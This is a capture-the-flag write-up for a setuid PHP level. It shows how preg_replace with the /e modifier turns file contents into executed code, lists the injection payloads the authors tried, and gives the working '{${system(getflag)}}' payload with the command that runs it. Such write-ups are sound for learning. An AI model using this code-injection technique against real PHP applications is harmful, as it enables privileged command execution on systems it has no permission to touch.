## level06

This level took way longer than it should have.

There is a PHP script `level06.php` and a binary executable `level06`. Both programs have the same behavior so we assumed (correctly) that `level06` is just a wrapper around `level06.php` with the setuid bit set in the permissions to execute as `flag06`. 

The first step was to prettify the code.

```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

`/e` is a deprecated PHP regex feature which, instead of replacing some text by another, replaces the first argument by the execution of the second argument. It was rapidly clear that it was the only attack vector. So we can reduce the code to its essentials. (we just have to keep in mind that the real program requires a dummy second argument)

```php
#!/usr/bin/php
<?php
function y($m) { return $m; }

preg_replace(
    "/(\[x (.*)\])/e",
    "y(\"\\2\")",
    file_get_contents($argv[1])
);
?>
```

The regex matches lines of the format `[x somestring]` and will call the `y` function on `somestring`. We just had to find a way to inject code in `somestring`. ez. After 8 hours of hard labor, here is a sample of the things we put in `/tmp/exploit`:
```
[x system('getflag')]
[x "system('getflag')"]
[x ") . system('getflag') //"]
[x ") . $z //"]
[x ") . system($z) //"]
[x ") . system('getflag') . y("]
[x \"\) . system('getflag') . y\(\"]
[x ${system($z)}]
[x {${system($z)}}]
[x {${$z('getflag')}}]
[x {${system('getflag')}}]

WINNER: 
[x {${system(getflag)}}]
```

`./level06 /tmp/exploit lol`

Why is the curly bracket syntax so hard to find online? Why doesn't it work with quotes around `getflag`? Why was it impossible to concatenate strings? These are many questions we will never have the answer to.
